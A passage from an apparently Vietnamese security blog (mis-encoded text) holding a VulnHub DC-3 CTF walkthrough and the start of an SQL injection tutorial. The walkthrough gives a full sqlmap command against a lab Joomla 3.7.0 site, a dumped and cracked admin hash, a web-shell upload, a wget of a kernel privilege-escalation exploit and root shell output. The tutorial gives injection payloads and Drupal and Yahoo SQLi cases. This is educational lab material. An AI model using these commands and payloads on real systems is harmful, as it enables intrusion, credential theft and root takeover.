/administrator n·ªØa.\n  S·ª≠ d·ª•ng Wappalyzer qu√©t xem con web n√†y ƒëang s·ª≠ d·ª•ng framework g√¨ n√†o. Joomla, th·∫ø th√¨ s·ª≠ d·ª•ng joomscan tr√™n kali th√¥i ch·ª© c√≤n g√¨ n·ªØa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  [+] FireWall Detector [++] Firewall not detected [+] Detecting Joomla Version [++] Joomla 3.7.0 [+] Core Joomla Vulnerability [++] Target Joomla core is not vulnerable [+] Checking Directory Listing [++] directory has directory listing : http://192.168.19.106/administrator/components http://192.168.19.106/administrator/modules http://192.168.19.106/administrator/templates http://192.168.19.106/images/banners [+] Checking apache info/status files [++] Readable info/status files are not found [+] admin finder [++] Admin page : http://192.168.19.106/administrator/ [+] Checking robots.txt existing [++] robots.txt is not found [+] Finding common backup files name [++] Backup files are not found [+] Finding common log files name [++] error log is not found [+] Checking sensitive config.php.x file [++] Readable config files are not found Your Report : reports/192.168.19.106/     Trang n√†y s·ª≠ d·ª•ng Joomla 3.7.0. Th·ª≠ l·ª•c c√°c CVE xem c√≥ c√°i n√†o n√≥i v·ªÅ Joomla 3.7.0 k.\n    V√£i nh√°i, h·∫≥n SQL Injection lu√¥n ·∫°, v√†o ƒë·ªçc th√¨ th·∫•y lu√¥n Using Sqlmap lu√¥n. Dump db ra th√¥i\n1  sqlmap -u \u0026#34;http://192.168.19.106/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]     L·∫•y ƒë∆∞·ª£c t√™n db r·ªìi l·∫•y t√™n b·∫£ng, dump th·∫≥ng v√†o table #__users ta th·∫•y ƒë∆∞·ª£c\n   id name email username password     629 admin freddy@norealaddress.net admin $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu      Ch√∫ng ta c√≥ admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu, s·ª≠ d·ª•ng hashcat ho·∫∑c john ƒë·ªÉ gi·∫£i ra ƒë∆∞·ª£c m·∫≠t kh·∫©u l√† snoopy.\n  S·ª≠ d·ª•ng m·∫≠t kh·∫©u ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o trang admin th√¥i :D\n  V√†o ƒë∆∞·ª£c trang r·ªìi ta nghƒ© ƒë·∫øn g√¨, upload file shell =)). ƒêi t√¨m ch·ªó n√†o upload ƒë∆∞·ª£c file. Th√¥i l√™n google h·ªèi cho nhanh. Google b·∫£o l√† v√†o template ƒë·ªÉ upload file nh√© :D.\n  ·ªû ƒë√¢y ch√∫ng ta s·ª≠a ƒë∆∞·ª£c nhi·ªÅu th·ª© l·∫Øm, c√°c b·∫°n c√≥ th·ªÉ v√†o ch·ªçc ngo√°y nh√©, m√¨nh upload shell l√™n error.php cho nhanh :D\n   X·ªãn x√≤ r·ªìi, b·∫Øt tay v√†o chi·∫øm quy·ªÅn root th√¥i √Ä th·ª±c ra ban ƒë·∫ßu m√¨nh c≈©ng ch·∫≥ng bi·∫øt n√™n b·∫Øt ƒë·∫ßu t·ª´ ƒë√¢u, th√¥i c·ª© th·ª≠ b·ª´a. l√™n google ƒë·ªçc m·∫•y c√°i CVE t·ª´ t√¨m ch∆∞∆°ng tr√¨nh n√†o ƒëang ch·∫°y d∆∞·ªõi quy·ªÅn root c√≥ l·ªó h·ªïng r·ªìi s·ª≠ d·ª•ng l·ªó h·ªïng ƒë√≥ ƒë·ªÉ chi·∫øm root, \u0026hellip; c√°c th·ª© c√°c th·ª©. M√¨nh th·ª≠ xem uname -a xem c√≥ g√¨ k. Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux. M√°y ch·ªß s·ª≠ d·ª•ng kernel 4.4.0. Search CVE ti·∫øp xem c√≥ l·ªói g√¨ ƒë·∫øn con Kernel n√†y k. S·ª≠ d·ª•ng searchsploit kernel 4.4 ra k·∫øt qu·∫£ Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PR | exploits/linux/local/39772.txt. Ta c√≥ th·ªÉ s·ª≠ d·ª•ng th·∫±ng n√†y ƒë·ªÉ chi·∫øm quy·ªÅn root. cd ƒë·∫øn /var/tmp r·ªìi wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip   Gi·∫£i n√©n c√°c th·ª© c√°c th·ª©    run compile.sh l√™n r·ªìi ch·∫°y file ./doubleput\n1 2 3 4 5 6 7 8 9  p0wny@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput starting writev woohoo, got pointer reuse writev returned successfully. if this worked, you\u0026#39;ll have a root shell in \u0026lt;=60 seconds. suid file detected, launching rootshell... we have root privs now... root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami;id root uid=0(root) gid=0(root) groups=0(root),33(www-data)     Ngon, c√≥ quy·ªÅn root r·ªìi, v√†o th∆∞ m·ª•c /root l·∫•y c·ªù th√¥i\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root root@shell:/root# ls the-flag.txt root@shell:/root# cat the-flag.txt __ __ _ _ ____ _ _ _ _ \\ \\ / /__| | | | _ \\ ___ _ __ ___| | | | | \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| \u0026#39;_ \\ / _ \\ | | | | \\ V V / __/ | | | |_| | (_) | | | | __/_|_|_|_| \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_) Congratulations are in order. :-) I hope you\u0026#39;ve enjoyed this challenge as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!! root@shell:/root#     K·∫øt lu·∫≠n  D·ª±a tr√™n b√†i lab th·∫•y ƒë∆∞·ª£c th·∫±ng Joomla c·∫ßn ph·∫£i ki·ªÉm tra c·∫≠p nh·∫≠t th∆∞·ªùng xuy√™n. Nh·ªØng ai ƒëang s·ª≠ d·ª•ng Joomla 3.7.0 c·∫ßn ph·∫£i ƒë∆∞·ª£c c·∫≠p nh·∫≠t ngay. Kernel Linux c≈©ng c·∫ßn ph·∫£i c·∫≠p nh·∫≠t l√™n b·∫£n cao h∆°n. C·∫ßn ch√∫ √Ω ƒë·∫øn c√°c phi√™n b·∫£n c·∫≠p nh·∫≠t ƒë·ªÉ v√° l·ªói c·∫ßn thi·∫øt.  ","permalink":"https://minhtuanact.ml/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/","summary":"M·ªü ƒë·∫ßu  V√†o m·ªôt ng√†y tr·ªùi k ƒë∆∞·ª£c ƒë·∫πp cho l·∫Øm, n·∫Øng kh√° g·∫Øt, captain c√≥ n√©m cho ch√∫ng t√¥i 1 ƒë∆∞·ªùng link v·ªÅ m·∫•y b√†i lab tr√™n VulnHub. V√† ƒë√¢y l√† m·ªôt trong m·ªôt s·ªë b√†i m√† ch√∫ng t√¥i l√†m ƒë∆∞·ª£c. C√°c b√†i kia r·ªìi c≈©ng s·∫Ω c√≥ b√†i vi·∫øt nhanh th√¥i :D. T√¥i c√≥ nhi·ªám v·ª• build con m√°y n√†y l√™n, c≈©ng kh√¥ng c√≥ kh√≥ khƒÉn g√¨ l·∫Øm.","title":"VulnHub CTF - DC-3 Walkthrough - Cu·ªôc phi√™u l∆∞u k·ª≥ th√∫"},{"content":"Description  SQL ( /Àà…õs kjuÀê Àà…õl/, ho·∫∑c /ÀàsiÀêkw…ôl/; Structured Query Language) hay ng√¥n ng·ªØ truy v·∫•n mang t√≠nh c·∫•u tr√∫c, l√† m·ªôt lo·∫°i ng√¥n ng·ªØ m√°y t√≠nh ph·ªï bi·∫øn ƒë·ªÉ t·∫°o, s·ª≠a, v√† l·∫•y d·ªØ li·ªáu t·ª´ m·ªôt h·ªá qu·∫£n tr·ªã c∆° s·ªü d·ªØ li·ªáu quan h·ªá. SQL Injection ho·∫∑c SQLi x·∫£y ra khi c√≥ m·ªôt l·ªó h·ªïng database-backed tr√™n trang web cho ph√©p Attacker truy v·∫•n ho·∫∑c t·∫•n c√¥ng database c·ªßa trang web. C√°c cu·ªôc t·∫•n c√¥ng SQLi th∆∞·ªùng ƒë∆∞·ª£c th∆∞·ªüng cao v√¨ m·ª©c ƒë·ªô nguy hi·ªÉm c·ªßa ch√∫ng. Attacker c√≥ th·ªÉ l·∫•y to√†n b·ªô d·ªØ li·ªáu tr√™n website c·ªßa b·∫°n, th·∫≠m ch√≠ c√≥ th·ªÉ ch·ªânh s·ª≠a ch√∫ng, thao t√∫ng v√† th·∫≠m ch√≠ c√≥ th·ªÉ t·ª± t·∫°o m·ªôt admin ƒëƒÉng nh·∫≠p v√†o c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n. \\  SQL Databases  Database l∆∞u tr·ªØ th√¥ng tin trong c√°c b·∫£n ghi v√† c√°c tr∆∞·ªùng c√≥ trong m·ªôt t·∫≠p h·ª£p c√°c b·∫£ng (c√≤n ƒë∆∞·ª£c g·ªçi l√† c√°c b·∫£ng d·ªØ li·ªáu). C√°c b·∫£ng ch·ª©a m·ªôt ho·∫∑c nhi·ªÅu c·ªôt, m·ªôt h√†ng trong b·∫£ng bi·ªÉu th·ªã m·ªôt b·∫£n ghi trong CSDL (c∆° s·ªü d·ªØ li·ªáu). Ng∆∞·ªùi d√πng d·ª±a v√†o ng√¥n ng·ªØ l·∫≠p tr√¨nh c√≥ t√™n l√† SQL ƒë·ªÉ t·∫°o, ƒë·ªçc, c·∫≠p nh·∫≠t v√† x√≥a c√°c b·∫£n ghi trong CSLD. Ng∆∞·ªùi d√πng g·ª≠i c√°c l·ªánh SQL (c√≤n ƒë∆∞·ª£c g·ªçi l√† c√¢u l·ªánh ho·∫∑c truy v·∫•n) ƒë·∫øn CSDL v√† gi·∫£ s·ª≠ c√°c l·ªánh ƒë∆∞·ª£c ch·∫•p nh·∫≠n, CSDL s·∫Ω di·ªÖn gi·∫£i c√°c c√¢u l·ªánh v√† th·ª±c hi·ªán m·ªôt s·ªë h√†nh ƒë·ªông. CSDL SQL ph·ªï bi·∫øn bao g·ªìm c√≥ MySQL, Postgresql, MSSQL, \u0026hellip; Ch√∫ng t√¥i s·∫Ω s·ª≠ d·ª•ng MySQL cho c√°c m·ª•c ƒë√≠ch c·ªßa ch∆∞∆°ng n√†y nh∆∞ng c√°c kh√°i ni·ªám chung √°p d·ª•ng cho t·∫•t c·∫£ c√°c CSDL SQL. C√°c c√¢u l·ªánh SQL ƒë∆∞·ª£c t·∫°o th√†nh t·ª´ c√°c t·ª´ kh√≥a v√† h√†m. V√≠ d·ª•: C√¢u l·ªánh sau cho CSDL ch·ªçn th√¥ng tin t·ª´ c·ªôt t√™n trong b·∫£ng ng∆∞·ªùi d√πng, cho c√°c b·∫£n ghi trong ƒë√≥ c·ªôt ID b·∫±ng 1. 1  SELECTnameFROMusersWHEREid=1;   Nhi·ªÅu trang web d·ª±a tr√™n CSDL ƒë·ªÉ l∆∞u tr·ªØ th√¥ng tin v√† s·ª≠ d·ª•ng th√¥ng tin ƒë√≥ ƒë·ªÉ t·ª± ƒë·ªông t·∫°o n·ªôi dung. V√≠ d·ª• trang https://www.leanpub.com/  l∆∞u tr·ªØ c√°c ƒë∆°n ƒë·∫∑t h√†ng tr∆∞·ªõc ƒë√≥ ho·∫∑c danh s√°ch c√°c s√°ch ƒëi·ªán t·ª≠ ƒë√£ mua trong CSDL m√† b·∫°n truy c·∫≠p khi ƒëƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n c·ªßa m√¨nh. Tr√¨nh duy·ªát web c·ªßa b·∫°n truy v·∫•n CSDL c·ªßa trang web v√† t·∫°o HTML d·ª±a tr√™n th√¥ng tin ƒë∆∞·ª£c tr·∫£ v·ªÅ. H√£y c√πng xem m·ªôt v√≠ d·ª• l√Ω thuy·∫øt v·ªÅ m√°y ch·ªß ƒë∆∞·ª£c code b·∫±ng PHP ƒë·ªÉ t·∫°o l·ªánh MySQL sau khi ng∆∞·ªùi d√πng truy c·∫≠p URL https://www.leanpub.com?name=yaworsk 1 2 3  $name = $_GET[\u0026#39;name\u0026#39;]; $q = \u0026#34;SELECT * FROM users WHERE name = \u0026#39;$name\u0026#39; \u0026#34;; mysql_query($query);    M√£ s·ª≠ d·ª•ng $_GET[] ƒë·ªÉ truy c·∫≠p gi√° tr·ªã t√™n t·ª´ c√°c tham s·ªë URL ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh gi·ªØa c√°c d·∫•u ngo·∫∑c v√† l∆∞u gi√° tr·ªã trong bi·∫øn $name. Tham s·ªë n√†y sau ƒë√≥ ƒë∆∞·ª£c chuy·ªÉn ƒë·∫øn bi·∫øn $q m√† kh√¥ng c·∫ßn sanitization. Bi·∫øn $q ƒë·∫°i di·ªán cho truy v·∫•n ƒë·ªÉ th·ª±c thi v√† t√¨m n·∫°p t·∫•t c·∫£ d·ªØ li·ªáu t·ª´ b·∫£ng users trong ƒë√≥ c·ªôt t√™n kh·ªõp v·ªõi gi√° tr·ªã trong tham s·ªë URL name. Truy v·∫•n ƒë∆∞·ª£c th·ª±c hi·ªán b·∫±ng c√°ch chuy·ªÉn bi·∫øn $q cho h√†m PHP mysql_query. Trang web tr·∫£ l·∫°i t√™n ch·ª©a vƒÉn b·∫£n th√¥ng th∆∞·ªùng, nh∆∞ng n·∫øu ng∆∞·ªùi d√πng nh·∫≠p 1 input 'OR 1='1 v√†o tham s·ªë URL nh∆∞ https://www.leanpub.com?name=test' OR 1='1, truy v·∫•n s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán l√†: 1  $query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;test\u0026#39; OR 1=\u0026#39;1\u0026#39; \u0026#34;;   Truy v·∫•n ƒë√£ ƒë∆∞·ª£c thay ƒë·ªïi sau khi ki·ªÉm tra gi√° tr·ªã v√† th√™m m√£ SQL OR 1='1 v√†o cu·ªëi truy v·∫•n. Trong tr∆∞·ªùng h·ª£p n√†y, SQLi s·ª≠a ƒë·ªïi m·ªánh ƒë·ªÅ WHERE ƒë·ªÉ t√¨m ki·∫øm c√°c b·∫£n ghi trong c·ªôt t√™n kh·ªõp v·ªõi ph·∫ßn search ho·∫∑c equattion 1='1 s·∫Ω tr·∫£ v·ªÅ gi√° tr·ªã true. MySQL coi 1 l√† s·ªë nguy√™n v√† v√¨ 1 lu√¥n b·∫±ng 1, ƒëi·ªÅu ki·ªán ƒë√∫ng v√† truy v·∫•n s·∫Ω tr·∫£ v·ªÅ t·∫•t c·∫£ c√°c b·∫£n ghi trong b·∫£ng users. Tuy nhi√™n, vi·ªác ki·ªÉm tra injection OR 1='1 s·∫Ω ho·∫°t ƒë·ªông khi c√°c ph·∫ßn kh√°c c·ªßa truy v·∫•n ƒë∆∞·ª£c sanitized. V√≠ d·ª•, b·∫°n c√≥ th·ªÉ c√≥ m·ªôt query nh∆∞: 1 2 3  $name=$_GET[\u0026#39;name\u0026#39;];$pw=mysql_real_escape_string($_GET[\u0026#39;password\u0026#39;]);$query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;$name\u0026#39; AND pw = \u0026#39;$pw\u0026#39; \u0026#34;;   Trong tr∆∞·ªùng h·ª£p n√†y, tham s·ªë password c≈©ng do ng∆∞·ªùi d√πng ki·ªÉm so√°t nh∆∞ng ƒë∆∞·ª£c sanitized ƒë√∫ng c√°ch b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m mysql_real_escape_string. N·∫øu b·∫°n s·ª≠ d·ª•ng payload, h√£y ki·ªÉm tra OR 1='1 l√†m name v√† m·∫≠t kh·∫©u s·∫Ω l√† 12345. 1  $query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;test\u0026#39; OR 1=\u0026#39;1\u0026#39; AND pw = \u0026#39;12345\u0026#39; \u0026#34;;   Query n√†y t√¨m ki·∫øm t·∫•t c·∫£ c√°c b·∫£n ghi c√≥ t√™n l√† 1='1 v√† m·∫≠t kh·∫©u l√† 12345 (v√≠ d·ª• ·ªü ƒë√¢y l√† CSDL ƒë∆∞·ª£c l∆∞u password ·ªü d·∫°ng r√µ, ch∆∞a bƒÉm hay m√£ h√≥a). V√¨ ki·ªÉm tra password s·ª≠ d·ª•ng to√°n t·ª≠ AND, truy v·∫•n n√†y c·ªßa ch√∫ng t√¥i ƒë√£ l·∫•y ƒë∆∞·ª£c d·ªØ li·ªáu tr·∫£ v·ªÅ v·ªõi name v√† m·∫≠t kh·∫©u l√† 12345. Nh∆∞ng b√¢y gi·ªù ch√∫ng ta c√≥ 1 ki·ªÉu t·∫•n c√¥ng kh√°c, b·∫±ng c√°ch th√™m ;--, ki·ªÉm tra 'OR 1='1;--. Ki·ªÉu Injection n√†y th·ª±c hi·ªán ƒë∆∞·ª£c 2 ƒëi·ªÅu: d·∫•u ch·∫•m ph·∫©y ; k·∫øt th√∫c c√¢u l·ªánh SQL v√† d·∫•u -- cho ph√©p comment l·∫°i t·∫•t c·∫£ c√¢u l·ªánh ·ªü ph√≠a sau n√≥. C√≥ nghƒ©a l√†: 1  $query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;test\u0026#39; OR 1=\u0026#39;1\u0026#39; AND pw = \u0026#39;12345\u0026#39; \u0026#34;;  Sau khi ch·ªânh s·ª≠a m·ªôt ch√∫t th√¨ s·∫Ω th√†nh 1  $query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;test\u0026#39; OR 1=\u0026#39;1\u0026#39;;-- AND pw = \u0026#39;12345\u0026#39; \u0026#34;;  V·∫≠y c√¢u l·ªánh SQL m√† $q g·ª≠i l√™n ƒë∆∞·ª£c th·ª±c thi s·∫Ω ch·ªâ c√≤n 1  $query=\u0026#34;SELECT * FROM users WHERE name = \u0026#39;test\u0026#39; OR 1=\u0026#39;1\u0026#39;;   C√¢u l·ªánh n√†y s·∫Ω gi√∫p ta l·∫•y ƒë∆∞·ª£c t·∫•t c·∫£ b·∫£n ghi c·ªßa b·∫£ng users.  Examples 1. Drupal SQL Injection  Drupal l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung ph·ªï bi·∫øn ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√¢y d·ª±ng trang web, r·∫•t gi·ªëng v·ªõi Wordpress v√† Joomla. N√≥ ƒë∆∞·ª£c vi·∫øt b·∫±ng PHP v√† d·ª±a tr√™n m√¥-ƒëun. C·ªông ƒë·ªìng Drupal kh√° m·∫°nh v√† cung c·∫•p mi·ªÖn ph√≠. Bao g·ªìm th∆∞∆°ng m·∫°i ƒëi·ªán t·ª≠, t√≠ch h·ª£p b√™n th·ª© ba, s·∫£n xu·∫•t n·ªôi dung,\u0026hellip; Tuy nhi√™n, m·ªçi c√†i ƒë·∫∑t Drupal ƒë·ªÅu ch·ª©a ucnfg m·ªôt b·ªô m√¥-ƒëu l√µi ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ch·∫°y n·ªÅn t·∫£ng v√† y√™u c·∫ßu k·∫øt n·ªëi v·ªõi CSDL. Ch√∫ng c√≤n ƒë∆∞·ª£c g·ªçi l√† l√µi Drupal. V√†o nƒÉm 2014, nh√≥m Drupal Security ƒë√£ ph√°t h√†nh b·∫£n c·∫≠p nh·∫≠t l√µi Drupal cho th·∫•y t·∫•t c·∫£ c√°c trang ch·∫°y Drupal ƒë·ªÅu b·ªã t·∫•n c√¥ng SQL b·ªüi ng∆∞·ªùi d√πng ·∫©n danh. T√°c ƒë·ªông c·ªßa l·ªó h·ªïng cho ph√©p k·∫ª t·∫•n c√¥ng chi·∫øm ƒë∆∞·ª£c b·∫•t k·ª≥ trang web Drupal n√†o. C·ª• th·ªÉ h∆°n, Drupal ƒë√£ s·ª≠ d·ª•ng ƒê·ªëi t∆∞·ª£ng d·ªØ li·ªáu PHP (PDO) l√†m giao di·ªán ƒë·ªÉ truy c·∫≠p c∆° s·ªü d·ªØ li·ªáu. C√°c nh√† ph√°t tri·ªÉn l√µi Drupal ƒë√£ vi·∫øt m√£ g·ªçi c√°c h√†m PDO ƒë√≥ v√† m√£ Drupal s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng b·∫•t c·ª© khi n√†o c√°c nh√† ph√°t tri·ªÉn kh√°c vi·∫øt m√£ ƒë·ªÉ t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu Drupal. ƒê√¢y l√† m·ªôt th·ª±c ti·ªÖn ph·ªï bi·∫øn trong ph√°t tri·ªÉn ph·∫ßn m·ªÅm. L√Ω do cho ƒëi·ªÅu n√†y l√† ƒë·ªÉ cho ph√©p Drupal ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi c√°c lo·∫°i c∆° s·ªü d·ªØ li·ªáu kh√°c nhau (MySQL, Postgres, v.v.), lo·∫°i b·ªè s·ª± ph·ª©c t·∫°p v√† cung c·∫•p ti√™u chu·∫©n h√≥a. B√¢y gi·ªù, ƒëi·ªÅu ƒë√≥ n√≥i r·∫±ng, h√≥a ra, Stefan ƒë√£ ph√°t hi·ªán ra r·∫±ng m√£ tr√¨nh bao b·ªçc Drupal ƒë∆∞a ra m·ªôt gi·∫£ ƒë·ªãnh kh√¥ng ch√≠nh x√°c v·ªÅ d·ªØ li·ªáu m·∫£ng ƒë∆∞·ª£c chuy·ªÉn ƒë·∫øn m·ªôt truy v·∫•n SQL. ƒê√¢y l√† m√£ g·ªëc: 1 2 3 4  foreach ($data as $i =\u0026gt; $value) { [...] $new_keys[$key . \u0026#39;_\u0026#39; . $i] = $value; }    B·∫°n c√≥ th·ªÉ ph√°t hi·ªán ra l·ªói kh√¥ng (t√¥i s·∫Ω c√≥ th·ªÉ)? C√°c nh√† ph√°t tri·ªÉn ƒë√£ ƒë∆∞a ra gi·∫£ ƒë·ªãnh r·∫±ng d·ªØ li·ªáu m·∫£ng s·∫Ω lu√¥n ch·ª©a c√°c kh√≥a s·ªë, nh∆∞ 0, 1, 2, v.v. (gi√° tr·ªã $i) v√† do ƒë√≥ h·ªç ƒë√£ tham gia bi·∫øn $key th√†nh $i v√† l√†m cho gi√° tr·ªã ƒë√≥ b·∫±ng v·ªõi gi√° tr·ªã. ƒê√¢y l√† m·ªôt truy v·∫•n th√¥ng th∆∞·ªùng s·∫Ω tr√¥ng nh∆∞ th·∫ø n√†o t·ª´ h√†m db_query c·ªßa Drupal: 1  db_query(\u0026#34;SELECT * FROM {users} WHERE name IN (:name)\u0026#34;,array(\u0026#39;:name\u0026#39;=\u0026gt;array(\u0026#39;user1\u0026#39;\\,\u0026#39;user2\u0026#39;)));   ·ªû ƒë√¢y h√†m db_query l·∫•y m·ªôt truy v·∫•n CSDL SELECT * FROM {users} where name IN (:name)v√† m·ªôt m·∫£ng c√°c gi√° tr·ªã ƒë·ªÉ thay th·∫ø cho c√°c ph·∫ßn gi·ªØ ch·ªó trong truy v·∫•n. Trong PHP, khi b·∫°n khai b√°o m·ªôt m·∫£ng l√† m·∫£ng (\u0026lsquo;value\u0026rsquo;, \u0026lsquo;value2\u0026rsquo;, \u0026lsquo;value3\u0026rsquo;), n√≥ th·ª±c s·ª± t·∫°o ra [0‚áí \u0026lsquo;value\u0026rsquo;, 1 ‚áí \u0026lsquo;value2\u0026rsquo;, 2 ‚áí \u0026lsquo;value3\u0026rsquo;] trong ƒë√≥ m·ªói gi√° tr·ªã c√≥ th·ªÉ truy c·∫≠p b·∫±ng kh√≥a s·ªë. Trong tr∆∞·ªùng h·ª£p n√†y, bi·∫øn t√™n: ƒë√£ ƒë∆∞·ª£c thay th·∫ø b·∫±ng c√°c gi√° tr·ªã trong m·∫£ng [0 ‚áí \u0026lsquo;user1\u0026rsquo;, 1‚áí \u0026lsquo;user2\u0026rsquo;]. Nh·ªØng g√¨ b·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c t·ª´ ƒëi·ªÅu n√†y l√†: 1  SELECT*FROMuserccsWHEREnameIN(:name_0,:name_1)   V·∫•n ƒë·ªÅ ph√°t sinh ti·∫øp s·∫Ω nh∆∞ sau: 1 2  db_query(\u0026#34;SELECT * FROM {users} where name IN (:name)\u0026#34;,array(\u0026#39;:name\u0026#39;=\u0026gt;array(\u0026#39;test) -- \u0026#39;=\u0026gt;\u0026#39;user1\u0026#39;,\u0026#39;test\u0026#39;=\u0026gt;\u0026#39;user2\u0026#39;)));   Trong tr∆∞·ªùng h·ª£p n√†y , :name l√† m·ªôt m·∫£ng v√† c√°c kh√≥a c·ªßa n√≥ l√† ‚Äòtest) -','test'. Khi Drupal nh·∫≠n ƒë∆∞·ª£c ƒëi·ªÅu n√†y v√† x·ª≠ l√Ω m·∫£ng ƒë·ªÉ t·∫°o truy v·∫•n, ƒëi·ªÅu c·∫ßn l√†m l√†: 1  SELECT*FROMusersWHEREnameIN(:name_test)-- , :name_test)    C√≥ th·ªÉ r·∫•t kh√≥ ƒë·ªÉ th·∫•y ƒë∆∞·ª£c l√Ω do t·∫°i sao l·∫°i nh∆∞ v·∫≠y, h√£y th·ª≠. D·ª±a tr√™n foreach, Drupal s·∫Ω l·∫ßn l∆∞·ª£t ƒëi qua t·ª´ng ph·∫ßn t·ª≠ trong m·∫£ng. V√¨ v·∫≠y, ƒë·ªëi v·ªõi ti√™u ch√≠ $i = test)- v√† $value = user1. B√¢y gi·ªù, $key l√† (:name) t·ª´ truy v·∫•n v√† k·∫øt h·ª£p v·ªõi $i, ch√∫ng ta nh·∫≠n ƒë∆∞·ª£c name_test)--. B√¢y gi·ªù, v·ªõi t·∫•t c·∫£ nh·ªØng g√¨ ƒë√£ c√≥. Drupal ƒëang ƒë√≥ng g√≥i c√°c ƒë·ªëi t∆∞·ª£ng PDO c·ªßa PHP ƒëi l∆∞·ª£n l·ªù =)), v√¨ PDO cho ph√©p nhi·ªÅu query. V√¨ v·∫≠y, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ v∆∞·ª£t qua ƒë∆∞·ª£c m√£ ƒë·ªôc, nh∆∞ truy v·∫•n SQL th·ª±c t·∫ø ƒë·ªÉ t·∫°o ng∆∞·ªùi d√πng qu·∫£n tr·ªã cho kh√≥a m·∫£ng, ƒë∆∞·ª£c gi·∫£i th√≠ch v√† th·ª±c thi d∆∞·ªõi d·∫°ng nhi·ªÅu truy v·∫•n.  2. Yahoo Sports Blind SQL  Theo blog c·ªßa m√¨nh, Stefano ƒë√£ t√¨m th·∫•y l·ªó h·ªïng SQLi nh·ªù tham s·ªë nƒÉm trong http://sports.yahoo.com/nfl/draft?year=2010\u0026amp;type=20\u0026amp;round=2. T·ª´ b√†i ƒëƒÉng c·ªßa anh ·∫•y, ƒë√¢y l√† m·ªôt v√≠ d·ª• v·ªÅ ph·∫£n h·ªìi h·ª£p l·ªá cho Url:  N√†o, b√¢y gi·ªù ch√∫ng ta th√™m -- v√†o sau year=2010 ta ƒë∆∞·ª£c g√¨.  L√Ω do cho ƒëi·ªÅu n√†y l√†, -- ƒë√≥ng vai tr√≤ l√† comment trong truy v·∫•n, nh∆∞ t√¥i ƒë√£ n√™u chi ti·∫øt ·ªü tr√™n. V√¨ v·∫≠y, n∆°i truy v·∫•n ban ƒë·∫ßu c·ªßa Yahoo c√≥ th·ªÉ tr√¥ng gi·ªëng nh∆∞: 1  SELECT*FROMPLAYERSWHEREYEAR=2010ANDTYPE=20ANDROUND=2;   Sau khi th√™m -- th√¨ c√¢u truy v·∫•n s·∫Ω tr·ªü th√†nh 1  SELECT*FROMPLAYERSWHEREYEAR=2010;   Nh·∫≠n ra ƒëi·ªÅu n√†y, ch√∫ng ta c√≥ th·ªÉ b·∫Øt ƒë·∫ßu l·∫•y th√¥ng tin CSDL t·ª´ Yahoo. V√≠ d·ª•: Stefano c√≥ th·ªÉ ki·ªÉm tra s·ªë phi√™n b·∫£n ch√≠nh c·ªßa ph·∫ßn m·ªÅm CSDL b·∫±ng c√°ch sau:  S·ª≠ d·ª•ng h√†m IF, ch√∫ng ta s·∫Ω ƒë∆∞·ª£c tr·∫£ v·ªÅ n·∫øu k√Ω t·ª± ƒë·∫ßu ti√™n t·ª´ h√†m version() l√† 5. H√†m IF c√≥ m·ªôt ƒëi·ªÅu ki·ªán l√† s·∫Ω tr·∫£ v·ªÅ gi√° tr·ªã sau n√≥ n·∫øu ƒëi·ªÅu ki·ªán l√† ƒë√∫ng v√† tham s·ªë cu·ªëi c√πng n·∫øu n√≥ sai. V√¨ v·∫≠y, d·ª±a theo h√¨nh tr√™n, ƒëi·ªÅu ki·ªán l√† k√Ω t·ª± ƒë·∫ßu ti√™n trong phi√™n b·∫£n. Do ƒë√≥, ch√∫ng t√¥i bi·∫øt phi√™n b·∫£n CSDL kh√¥ng ph·∫£i l√† 5 v√¨ kh√¥ng c√≥ k·∫øt qu·∫£ n√†o ƒë∆∞·ª£c tr·∫£ v·ªÅ. L√Ω do ƒë√¢y l√† ƒë∆∞·ª£c coi l√† m·ªôt SQLi m√π qu√°ng l√† b·ªüi v√¨ Stefano c√≥ th·ªÉ nh√¨n th·∫•y k·∫øt qu·∫£ tr·ª±c ti·∫øp, anh ·∫•y c√≥ th·ªÉ ch·ªâ c·∫ßn in ra phi√™n b·∫£n CSDL v√¨ Yahoo ch·ªâ tr·∫£ l·∫°i ng∆∞·ªùi d√πng. Tuy nhi√™n, b·∫±ng c√°ch thao 